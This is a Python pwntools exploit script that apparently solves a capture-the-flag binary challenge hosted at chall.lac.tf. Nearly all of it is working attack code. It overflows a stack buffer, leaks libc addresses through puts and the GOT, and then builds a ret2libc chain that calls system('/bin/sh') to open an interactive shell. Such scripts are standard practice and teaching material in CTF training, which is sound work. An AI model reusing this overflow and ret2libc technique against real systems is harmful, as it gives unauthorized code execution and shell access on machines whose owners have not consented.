#!/usr/bin/env python3

from pwn import *

exe = ELF("./sus_patched")
libc = ELF("./libc6_2.36-9+deb12u4_amd64.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, '''
                break *main+63
                ''')
    else:
        r = remote("chall.lac.tf", 31284)

    return r


def leak_func_addr(func: str) -> int:
    # 56 + got_addr + RBP + puts_plt + main (loop)
    payload = b"A" * 56 + p64(exe.got[func]) + b"B" * 8 + p64(exe.plt["puts"]) + p64(exe.symbols["main"])
    r.sendline(payload)

    return int.from_bytes(r.recvlines(2)[-1], byteorder = "little")


# NOTE: no canary despite checksec says it's there
def main():
    r = conn()

    if libc is not None:
        libc.address = leak_func_addr("puts") - libc.symbols["puts"]
        log.info(f"LIBC base address @ 0x{libc.address:x}")

        # 56 + bin_sh_ptr + RBP + dummy_ret + system
        system = libc.symbols["system"]
        bin_sh = next(libc.search(b"/bin/sh"))
        ret    = 0x401016

        payload = b"A" * 56 + p64(bin_sh) + b"B" * 8 + p64(ret) + p64(system)
        r.sendline(payload)

    else:
        puts_addr = leak_func_addr("puts")
        log.info(f"puts @ 0x{puts_addr:x}")

        gets_addr = leak_func_addr("gets")
        log.info(f"gets @ 0x{gets_addr:x}")

        setbuf_addr = leak_func_addr("setbuf")
        log.info(f"setbuf @ 0x{setbuf_addr:x}")

    r.interactive("$ ")


if __name__ == "__main__":
    main()
